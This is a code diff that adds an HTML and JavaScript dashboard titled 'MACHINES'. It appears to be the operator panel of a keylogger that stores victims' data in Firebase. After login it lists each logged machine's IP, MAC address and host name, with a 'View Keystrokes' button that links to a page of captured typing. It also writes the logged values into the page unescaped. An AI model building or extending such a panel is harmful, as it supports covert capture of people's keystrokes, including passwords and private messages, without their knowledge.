@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="image.png" size="64*64" type="image/png">
+    <title>Firebase Data Table</title>
+    <style>
+        body {
+            background-color: #0e0e0e;
+            color: #00FF00;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .main-heading {
+            font-size: 3em;
+            color: #00FF00;
+            text-shadow: 0 0 10px #00FF00, 0 0 20px #00FF00, 0 0 30px #00FF00;
+            margin: 20px 0;
+            z-index: 2;
+        }
+
+        .table-container {
+            width: 90%;
+            max-width: 1000px;
+            background-color: #1c1c1c;
+            padding: 20px;
+            border: 1px solid #00FF00;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0, 255, 0, 0.5);
+            overflow: hidden;
+            z-index: 2;
+        }
+
+        .table-heading {
+            text-align: center;
+            font-size: 1.5em;
+            margin-bottom: 20px;
+            color: #00FF00;
+        }
+
+        .table-wrapper {
+            max-height: 500px;
+            overflow-y: auto;
+            margin-top: 20px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background-color: #2e2e2e;
+        }
+
+        th, td {
+            border: 1px solid #00FF00;
+            padding: 12px;
+            text-align: center;
+            vertical-align: middle;
+            color: #e0e0e0;
+        }
+
+        th {
+            background-color: #007700;
+            color: #ffffff;
+            position: sticky;
+            top: 0;
+            z-index: 1;
+            font-weight: bold;
+        }
+
+        button {
+            background-color: #003b46;
+            color: #00FF00;
+            border: none;
+            padding: 8px 16px;
+            cursor: pointer;
+            border-radius: 8px;
+            font-size: 1em;
+            transition: background-color 0.3s, transform 0.3s;
+            position: relative;
+        }
+
+        button:hover {
+            background-color: #004d4d;
+            transform: scale(1.05);
+        }
+
+        button::after {
+            content: attr(data-tooltip);
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #000;
+            color: #00FF00;
+            padding: 5px;
+            border-radius: 5px;
+            white-space: nowrap;
+            font-size: 0.75em;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+
+        button:hover::after {
+            opacity: 1;
+        }
+
+        tbody tr:hover {
+            background-color: #333333;
+            cursor: pointer;
+        }
+
+        .loading {
+            font-size: 1.5em;
+            color: #00FF00;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        #particles-js {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+
+            .table-container {
+                width: 100%;
+                padding: 10px;
+                box-shadow: none;
+            }
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+    <script>
+        const firebaseConfig = {
+            // space for firebase credentials
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+
+        auth.onAuthStateChanged(user => {
+            if (!user) {
+                console.log('User not authenticated, redirecting to login page');
+                window.location.href = 'index.html';
+            } else {
+                console.log('User authenticated, fetching data');
+                fetchData();
+            }
+        });
+
+        function fetchData() {
+            const loadingIndicator = document.createElement('div');
+            loadingIndicator.className = 'loading';
+            loadingIndicator.textContent = 'Loading data...';
+            document.getElementById('results').appendChild(loadingIndicator);
+
+            const db = firebase.database();
+            const logRef = db.ref('log');
+
+            logRef.once('value', (logSnapshot) => {
+                const logs = logSnapshot.val();
+                if (logs) {
+                    const distinctMacs = {};
+                    const results = [];
+
+                    for (const logId in logs) {
+                        const logEntry = logs[logId];
+                        if (!distinctMacs[logEntry.mac]) {
+                            distinctMacs[logEntry.mac] = true;
+                            results.push({
+                                ip: logEntry.ip,
+                                mac: logEntry.mac,
+                                host_name: logEntry.host_name
+                            });
+                        }
+                    }
+                    displayResults(results);
+                } else {
+                    displayResults([]);
+                }
+            }).catch(error => {
+                console.error('Error fetching logs:', error);
+            }).finally(() => {
+                loadingIndicator.remove();
+            });
+        }
+
+        function displayResults(results) {
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML = '';
+
+            if (results.length > 0) {
+                const wrapper = document.createElement('div');
+                wrapper.classList.add('table-wrapper');
+                const table = document.createElement('table');
+                const thead = document.createElement('thead');
+                thead.innerHTML = '<tr><th>S.No</th><th>IP</th><th>MAC</th><th>Host Name</th><th>Keystrokes</th></tr>';
+                table.appendChild(thead);
+                const tbody = document.createElement('tbody');
+                results.forEach((result, index) => {
+                    const tr = document.createElement('tr');
+                    const viewButton = `<button data-tooltip="View Keystrokes" onclick="viewKeystrokes('${result.ip}')">View</button>`;
+                    tr.innerHTML = `<td>${index + 1}</td><td>${result.ip}</td><td>${result.mac}</td><td>${result.host_name}</td><td>${viewButton}</td>`;
+                    tbody.appendChild(tr);
+                });
+                table.appendChild(tbody);
+                wrapper.appendChild(table);
+                resultsDiv.appendChild(wrapper);
+            } else {
+                resultsDiv.innerHTML = '<p class="no-results">No results found</p>';
+            }
+        }
+
+        function viewKeystrokes(ip) {
+            const url = `keystrokes.html?ip=${encodeURIComponent(ip)}`;
+            window.location.href = url;
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            particlesJS('particles-js', {
+                particles: {
+                    number: {
+                        value: 50,
+                        density: {
+                            enable: true,
+                            value_area: 800
+                        }
+                    },
+                    color: {
+                        value: ['#00ff00', '#00ff00', '#00ff00'] // Green, red, blue
+                    },
+                    shape: {
+                        type: ['circle', 'circle', 'circle'], // Multiple shapes
+                        stroke: {
+                            width: 1,
+                            color: '#00ff00'
+                        }
+                    },
+                    opacity: {
+                        value: 0.5,
+                        random: true,
+                        anim: {
+                            enable: true,
+                            speed: 0.6,
+                            opacity_min: 0.1,
+                            sync: false
+                        }
+                    },
+                    size: {
+                        value: 4,
+                        random: true,
+                        anim: {
+                            enable: true,
+                            speed: 8,
+                            size_min: 0.1,
+                            sync: false
+                        }
+                    },
+                    line_linked: {
+                        enable: true,
+                        distance: 100,
+                        color: '#00ff00',
+                        opacity: 0.4,
+                        width: 1
+                    },
+                    move: {
+                        enable: true,
+                        speed: 4,
+                        direction: 'none',
+                        random: true,
+                        straight: false,
+                        out_mode: 'out',
+                        bounce: false,
+                        attract: {
+                            enable: false,
+                            rotateX: 600,
+                            rotateY: 1200
+                        }
+                    }
+                },
+                interactivity: {
+                    detect_on: 'canvas',
+                    events: {
+                        onhover: {
+                            enable: true,
+                            mode: 'grab'
+                        },
+                        onclick: {
+                            enable: true,
+                            mode: 'push'
+                        },
+                        resize: true
+                    },
+                    modes: {
+                        grab: {
+                            distance: 200,
+                            line_linked: {
+                                opacity: 1
+                            }
+                        },
+                        bubble: {
+                            distance: 250,
+                            size: 8,
+                            duration: 2,
+                            opacity: 0.8,
+                            speed: 3
+                        },
+                        repulse: {
+                            distance: 100,
+                            duration: 0.4
+                        },
+                        push: {
+                            particles_nb: 4
+                        },
+                        remove: {
+                            particles_nb: 2
+                        }
+                    }
+                },
+                retina_detect: true
+            });
+        });
+    </script>
+</head>
+<body>
+    <div id="particles-js"></div>
+    <div class="main-heading">MACHINES</div>
+    <div class="table-container">
+        <div class="table-heading">Firebase Data Table</div>
+        <div id="results"></div>
+    </div>
+</body>
+</html>
